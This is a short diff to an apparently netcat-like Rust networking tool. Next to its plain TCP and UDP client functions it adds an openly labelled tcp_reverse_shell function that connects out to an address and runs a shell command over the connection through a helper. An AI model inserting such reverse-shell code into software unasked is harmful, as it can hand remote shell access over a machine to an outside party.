@@ -1,6 +1,8 @@
 use std::io;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
+use crate::common::read_write_exec;
+
 /// Client that connect to a TCP server and stream data
 /// from stdin to the server and from the server to stdout
 pub async fn tcp_client(addr: &str, port: u16) -> io::Result<()> {
@@ -69,5 +71,14 @@ pub async fn udp_client(addr: &str, port: u16) -> io::Result<()> {
             }
         )
     }
+    Ok(())
+}
+
+/// Reverse shell client that connects to a TCP server and exec a shell command
+pub async fn tcp_reverse_shell(addr: &str, port: u16, cmd: &str) -> io::Result<()> {
+    let stream = tokio::net::TcpStream::connect((addr, port)).await?;
+    // Get reader and writer from the stream
+    let (reader, writer) = stream.into_split();
+    read_write_exec(reader, writer, cmd).await?;
     Ok(())
 }
